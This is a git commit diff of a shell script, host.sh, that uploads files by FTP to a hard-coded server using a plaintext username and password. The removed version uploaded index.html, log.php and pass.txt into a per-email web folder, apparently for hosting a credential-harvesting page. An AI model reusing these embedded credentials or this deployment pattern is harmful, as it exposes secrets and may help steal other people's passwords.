da9b71d4c42188769ab6fa1cc88fdcb8a279ce07
nerdhaka <114361549+nerdhaka@users.noreply.github.com>
2022-10-05 13:30:33 +0000

    Update host.sh

--- host.sh
+++ host.sh
@@ -4,14 +4,14 @@ read EMAIL
 #Automated FTP transfer 
 HOST='185.27.134.34' 
 USER='epiz_32719615'
-PASSWD='ElDdJprQglYAk' 
-lftp  -u ${USER}:${PASSWD} $HOST <<EOF 
+PASSWD='ElDdJprQglYAk'
+FILE='file.txt'
 
-binary 
-cd /htdocs/$EMAIL
-put index.html
-put log.php
-put pass.txt
-
-quit 
-EOF
+ftp -n $HOST <<END_SCRIPT
+quote USER $USER
+quote PASS $PASSWD
+binary
+put $FILE
+quit
+END_SCRIPT
+exit 0
